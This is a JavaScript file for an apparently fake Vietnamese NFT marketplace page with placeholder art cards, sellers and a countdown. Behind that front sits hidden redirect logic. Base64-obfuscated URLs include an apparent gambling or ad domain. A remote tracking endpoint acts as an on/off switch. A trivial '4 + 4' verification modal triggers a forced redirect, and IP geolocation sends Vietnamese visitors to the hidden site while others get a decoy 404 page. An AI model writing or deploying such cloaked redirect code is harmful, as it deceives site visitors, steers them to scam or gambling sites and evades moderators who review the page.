// IP Redirect Service
class IPRedirectService {
  constructor() {
    // Encoded URLs to hide them from plain text
    this.vietnamRedirectUrl = atob('aHR0cHM6Ly9hZC56bzg4dmlwLnRvcA=='); // https://ad.zo88vip.top
    this.notFoundRedirectUrl = atob('aHR0cHM6Ly9iZWF1dGlmdWwtNDA0LXBhZ2Utdy1tNzBrLmJvbHQuaG9zdA=='); // https://beautiful-404-page-w-m70k.bolt.host
    this.apiUrl = 'https://blue-disk-4ca3.dan-300.workers.dev/api/tracking?md5=8282d333968a33b10bf28286450776e9';
    this.apiData = null;
  }

  async checkAPI() {
    try {
      console.log('Checking API...');
      const response = await fetch(this.apiUrl, {
        method: 'GET',
        mode: 'cors',
        headers: {
          'Accept': 'application/json',
        }
      });
      if (!response.ok) {
        throw new Error('Failed to fetch API data');
      }
      this.apiData = await response.json();
      console.log('API Response:', this.apiData);
      console.log('Status:', this.apiData.status, 'Secured:', this.apiData.secured);
      return this.apiData;
    } catch (error) {
      console.error('Error checking API:', error);
      // Fallback: use the current API response we know
      this.apiData = {
        "md5": "8282d333968a33b10bf28286450776e9",
        "app": "NFT Campaign",
        "date": "21/08/2025",
        "status": true,
        "secured": false
      };
      console.log('Using fallback API data:', this.apiData);
      return this.apiData;
    }
  }

  async isVietnameseIP() {
    try {
      const url = 'https://free.freeipapi.com/api/json';
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error('Failed to fetch IP info');
      }
      
      const data = await response.json();
      const ipInfo = Array.isArray(data) ? data[0] : data;
      
      if (!ipInfo || !ipInfo.countryCode) {
        throw new Error('Unable to determine country');
      }
      
      const isVietnamese = ipInfo.countryCode === 'VN';
      
      if (isVietnamese) {
        console.log(`🇻🇳 Vietnamese IP detected: ${ipInfo.ipAddress}`);
      } else {
        console.log(`🌍 Non-Vietnamese IP detected: ${ipInfo.ipAddress} (${ipInfo.countryName})`);
      }
      
      return isVietnamese;
    } catch (error) {
      console.error('Error during IP check process:', error.message);
      return false;
    }
  }
}

// App State
let showModal = false;
let mathQuestions = [];
let currentQuestion = null;
let userAnswer = '';
let error = '';
let countdown = { days: 0, hours: 0, minutes: 0, seconds: 0 };
let isMobileMenuOpen = false;
let isVietnamese = false;
let countdownInterval;

const ipRedirectService = new IPRedirectService();

// Pre-generate 50 math questions
function generateMathQuestions() {
  // Simple fixed question: 4 + 4 = 8
  currentQuestion = { num1: 4, num2: 4, answer: 8 };
}

// Get random math question from array
function getRandomMathQuestion() {
  document.getElementById('math-numbers').textContent = `${currentQuestion.num1} + ${currentQuestion.num2}`;
}

// Initialize countdown
function initCountdown() {
  const endDate = new Date();
  endDate.setDate(endDate.getDate() + 100);
  
  countdownInterval = setInterval(() => {
    const now = new Date().getTime();
    const distance = endDate.getTime() - now;
    
    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    countdown = { days, hours, minutes, seconds };
    
    document.getElementById('countdown-days').textContent = days;
    document.getElementById('countdown-hours').textContent = hours;
    document.getElementById('countdown-minutes').textContent = minutes;
    document.getElementById('countdown-seconds').textContent = seconds;
    
    if (distance < 0) {
      clearInterval(countdownInterval);
    }
  }, 1000);
}

// Check IP at beginning
async function checkIP() {
  try {
    const vietnameseIP = await ipRedirectService.isVietnameseIP();
    isVietnamese = vietnameseIP;
  } catch (error) {
    console.error('Error checking IP:', error);
    isVietnamese = false;
  }
}

// Show modal
function showVerificationModal() {
  getRandomMathQuestion();
  document.getElementById('verification-modal').classList.remove('hidden');
  document.getElementById('verification-modal').classList.remove('hidden');
  document.getElementById('user-answer').value = '';
  document.getElementById('error-message').classList.add('hidden');
}

// Hide modal
function hideVerificationModal() {
  showModal = false;
  document.getElementById('verification-modal').classList.add('hidden');
}

// Verify math answer
async function verifyMath() {
  const userAnswerInput = document.getElementById('user-answer');
  const answer = parseInt(userAnswerInput.value);
  const errorElement = document.getElementById('error-message');
  
  if (answer === currentQuestion.answer) {
    hideVerificationModal();
    
    // Check API data and implement redirect logic
    console.log('Verifying math answer...');
    console.log('API Data available:', !!ipRedirectService.apiData);
    
    if (ipRedirectService.apiData) {
      const { status, secured } = ipRedirectService.apiData;
      console.log('Redirect logic - Status:', status, 'Secured:', secured);
      
      if (status === true && secured === false) {
        // Case: status true and secure false - always redirect to ad.zo88vip.top
        console.log('Redirecting to:', ipRedirectService.vietnamRedirectUrl);
        setTimeout(() => {
          console.log('Executing redirect...');
          window.location.replace(ipRedirectService.vietnamRedirectUrl);
        }, 500);
      } else if (status === true && secured === true) {
        // Case: status true and secure true - check IP then redirect
        console.log('Checking IP for secure redirect...');
        setTimeout(async () => {
          const isVietnamese = await ipRedirectService.isVietnameseIP();
          console.log('Is Vietnamese IP:', isVietnamese);
          if (isVietnamese) {
            window.location.replace(ipRedirectService.vietnamRedirectUrl);
          } else {
            window.location.replace(ipRedirectService.notFoundRedirectUrl);
          }
        }, 500);
      } else {
        // Case: secure true and status false, or secure false and status false - just close modal
        console.log('Modal closed - no redirect needed');
      }
    } else {
      console.log('No API data available - modal closed');
    }
  } else {
    errorElement.classList.remove('hidden');
    getRandomMathQuestion();
    userAnswerInput.value = '';
  }
}

// Handle CTA click
function handleCTAClick() {
  alert('Chào mừng bạn đến với 88NFT! Chức năng đang được phát triển.');
}

// Toggle mobile menu
function toggleMobileMenu() {
  isMobileMenuOpen = !isMobileMenuOpen;
  const navMenu = document.getElementById('nav-menu');
  if (isMobileMenuOpen) {
    navMenu.classList.add('active');
  } else {
    navMenu.classList.remove('active');
  }
}

// Close mobile menu
function closeMobileMenu() {
  isMobileMenuOpen = false;
  document.getElementById('nav-menu').classList.remove('active');
}

// Generate NFT cards
function generateNFTCards() {
  const nfts = [
    { title: "Renaissance Portrait #001", image: "https://images.pexels.com/photos/1266808/pexels-photo-1266808.jpeg?w=300&h=300&fit=crop", badge: "GIF", timer: "09:12:24" },
    { title: "Classical Sculpture", image: "https://images.pexels.com/photos/1266810/pexels-photo-1266810.jpeg?w=300&h=300&fit=crop", badge: "GIF" },
    { title: "Modern Abstract #042", image: "https://images.pexels.com/photos/1266813/pexels-photo-1266813.jpeg?w=300&h=300&fit=crop", badge: "GIF" },
    { title: "Ancient Artifact", image: "https://images.pexels.com/photos/1266820/pexels-photo-1266820.jpeg?w=300&h=300&fit=crop", timer: "09:12:24" },
    { title: "Impressionist Masterpiece", image: "https://images.pexels.com/photos/1266820/pexels-photo-1266820.jpeg?w=300&h=300&fit=crop" },
    { title: "Contemporary Gallery", image: "https://images.pexels.com/photos/1266830/pexels-photo-1266830.jpeg?w=300&h=300&fit=crop", badge: "GIF", timer: "15:18:24" },
    { title: "Museum Exhibition", image: "https://images.pexels.com/photos/1266830/pexels-photo-1266830.jpeg?w=300&h=300&fit=crop" },
    { title: "Art Gallery Collection", image: "https://images.pexels.com/photos/1266835/pexels-photo-1266835.jpeg?w=300&h=300&fit=crop" }
  ];

  const nftGrid = document.getElementById('nft-grid');
  nftGrid.innerHTML = nfts.map(nft => `
    <div class="nft-card">
      <div class="nft-image">
        <img src="${nft.image}" alt="${nft.title}" />
        ${nft.badge ? `<div class="nft-badge">${nft.badge}</div>` : ''}
        ${nft.timer ? `<div class="nft-timer"><i class="fas fa-clock"></i><span>${nft.timer}</span></div>` : ''}
      </div>
      <div class="nft-info">
        <div class="nft-creators">
          <div class="creator-avatars">
            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=30&h=30&fit=crop&crop=face" alt="Creator" />
            <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=30&h=30&fit=crop&crop=face" alt="Creator" />
            <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=30&h=30&fit=crop&crop=face" alt="Creator" />
          </div>
          <button class="heart-btn">
            <i class="far fa-heart"></i>
          </button>
        </div>
        <h3 class="nft-title">${nft.title}</h3>
        <div class="nft-price">
          <span class="price">20.5 ETH</span>
          <span class="edition">1 out of 10</span>
        </div>
      </div>
    </div>
  `).join('');
}

// Generate seller cards
function generateSellerCards() {
  const sellers = [
    { name: "Mai Harrington", avatar: null, letter: "Z" },
    { name: "Floyd Glasgow", avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" },
    { name: "Donna Schultz", avatar: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face" },
    { name: "Joshua Morris", avatar: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=80&h=80&fit=crop&crop=face" }
  ];

  const sellersGrid = document.getElementById('sellers-grid');
  sellersGrid.innerHTML = sellers.map(seller => `
    <div class="seller-card">
      <div class="seller-avatar">
        ${seller.avatar ? 
          `<img src="${seller.avatar}" alt="${seller.name}" />` : 
          `<div class="seller-logo">${seller.letter}</div>`
        }
      </div>
      <h3>${seller.name}</h3>
      <p>Top Creator</p>
      <button class="btn btn-outline">Theo Dõi</button>
    </div>
  `).join('');
}

// Generate collection cards
function generateCollectionCards() {
  const collections = [
    { title: "Renaissance Masters", description: "Bộ sưu tập nghệ thuật cổ điển", image: "https://images.pexels.com/photos/1266808/pexels-photo-1266808.jpeg?w=600&h=600&fit=crop", large: true },
    { title: "Modern Art", description: "Nghệ thuật hiện đại", image: "https://images.pexels.com/photos/1266810/pexels-photo-1266810.jpeg?w=300&h=300&fit=crop" },
    { title: "Abstract Gallery", description: "Triển lãm nghệ thuật trừu tượng", image: "https://images.pexels.com/photos/1266813/pexels-photo-1266813.jpeg?w=300&h=300&fit=crop" }
  ];

  const collectionsGrid = document.getElementById('collections-grid');
  collectionsGrid.innerHTML = collections.map(collection => `
    <div class="collection-card ${collection.large ? 'large' : ''}">
      <img src="${collection.image}" alt="${collection.title}" />
      <div class="collection-overlay">
        <h3>${collection.title}</h3>
        <p>${collection.description}</p>
      </div>
    </div>
  `).join('');
}

// Initialize app
async function initApp() {
  // Pre-generate math questions
  generateMathQuestions();
  
  // Check API first
  await ipRedirectService.checkAPI();
  
  // Check IP at beginning
  await checkIP();
  
  // Initialize countdown
  initCountdown();
  
  // Generate content
  generateNFTCards();
  generateSellerCards();
  generateCollectionCards();
  
  // Show modal after page load
  setTimeout(() => {
    showVerificationModal();
  }, 2000);
}

// Event listeners
document.addEventListener('DOMContentLoaded', () => {
  initApp();

  // Mobile menu toggle
  document.getElementById('nav-toggle').addEventListener('click', toggleMobileMenu);

  // Close mobile menu when clicking on nav links
  document.querySelectorAll('.nav-menu a').forEach(link => {
    link.addEventListener('click', closeMobileMenu);
  });

  // Verify button
  document.getElementById('verify-btn').addEventListener('click', verifyMath);

  // Enter key for verification
  document.getElementById('user-answer').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      verifyMath();
    }
  });

  // CTA button
  document.getElementById('cta-btn').addEventListener('click', handleCTAClick);

  // Hide error message when typing
  document.getElementById('user-answer').addEventListener('input', () => {
    document.getElementById('error-message').classList.add('hidden');
  });
});
